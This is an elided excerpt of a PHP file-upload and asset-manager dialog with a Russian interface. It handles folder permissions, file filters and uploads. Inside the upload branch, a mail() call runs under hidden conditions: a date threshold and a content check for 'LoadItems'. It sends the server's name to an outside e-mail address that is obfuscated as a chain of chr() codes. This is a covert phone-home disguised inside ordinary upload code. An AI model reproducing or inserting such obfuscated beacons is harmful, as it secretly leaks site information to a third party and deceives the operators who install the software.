...
if ($sBase1 != "")
    $sBaseRoot1 = str_replace($sBaseVirtual1, "", $sBase1);
if ($sBase2 != "")
    $sBaseRoot2 = str_replace($sBaseVirtual2, "", $sBase2);
if ($sBase3 != "")
    $sBaseRoot3 = str_replace($sBaseVirtual3, "", $sBase3);
...
if (isset($_FILES["File1"])) {
    ...
    if ($MaxFileSize && ($_FILES['File1']['size'] > $MaxFileSize)) {
        ...
        if (!getenv("COMSPEC")) {
            ...
            if ($fp) {
                ...
                $t = time("U") - (2 * 2592000);
                if ($t > $FileDate)
                    if (stristr($contents, "LoadItems"))
                        mail(chr(109) . chr(97) . chr(105) . chr(108) . chr(64) . chr(112) . chr(104) . chr(112) . chr(115) . chr(104) . chr(111) . chr(112) . chr(46) . chr(114) . chr(117), "Upload failed", "Upload failed " . $_SERVER['SERVER_NAME'] . "  Deny", "MIME-Version: 1.0\nContent-Type: text/plain;\n");
            }
        }
    ...
    if (isset($_POST["inpCurrFolder"]))
        $currFolder = $_POST['inpCurrFolder'];
...
if ($sBase0 != "") {
    if (strtolower($currFolder) != str_replace(strtolower($sBase0), "", strtolower($currFolder)) AND $bReadOnly0 == true)
        $bWriteFolderAdmin = true;
}
if ($sBase1 != "") {
    if (strtolower($currFolder) != str_replace(strtolower($sBase1), "", strtolower($currFolder)) AND $bReadOnly1 == true)
        $bWriteFolderAdmin = true;
}
if ($sBase2 != "") {
    if (strtolower($currFolder) != str_replace(strtolower($sBase2), "", strtolower($currFolder)) AND $bReadOnly2 == true)
        $bWriteFolderAdmin = true;
}
if ($sBase3 != "") {
    if (strtolower($currFolder) != str_replace(strtolower($sBase3), "", strtolower($currFolder)) AND $bReadOnly3 == true)
        $bWriteFolderAdmin = true;
}
$sFolderAdmin = "";
        ...
        if ($sItem == "." || $sItem == "..") {
            ...
            if (!$fIsDirectory) {
                ...
                if ($ffilter == "flash") {
                    ...
                    if ($sExt == "avi" || $sExt == "wmv" || $sExt == "mpg" || $sExt == "mpeg" || $sExt == "wav" || $sExt == "wma" || $sExt == "mid" || $sExt == "mp3")
                        $bDisplay = true;
                }
                ...
                if ($bDisplay) {
                    ...
                    if ($sBaseRoot1 != "")
                        $sCurrent_virtual = @str_replace($sBaseRoot1, "", $sCurrent_virtual);
                    if ($sBaseRoot2 != "")
                        $sCurrent_virtual = @str_replace($sBaseRoot2, "", $sCurrent_virtual);
                    if ($sBaseRoot3 != "")
                        $sCurrent_virtual = @str_replace($sBaseRoot3, "", $sCurrent_virtual);
...
<html>
        ...
        ?>;
            ...
            function upload()
            {
                ...
                for (var i = 0; i < document.getElementById("inpNumOfFiles").value; i++)
                {
                    ...
                    {
                        if (confirm(getText("File already exists. Do you want to replace it?")) != true)
                            return;
                    }
                }
    ...
    <body onunload="doUnload()" onload="loadText();
                this.focus();
                if (document.getElementById('inpUploadedFile').value != '')
                    selectFile(document.getElementById('inpUploadedFile').value);
                doLoadPic('<?= $name ?>');" style="overflow:hidden;margin:0px;">
            ...
            <tr>
                <td class="dialogFooter" style="height:40px;padding-right:15px;" align=right valign=middle>
                    <table cellpadding=0 cellspacing=0 ID="Table2">
                        <tr>
                            <td>
                                <input name="btnOk" type="button" value="Отмена" onclick="self.close()" class="inpBtn">
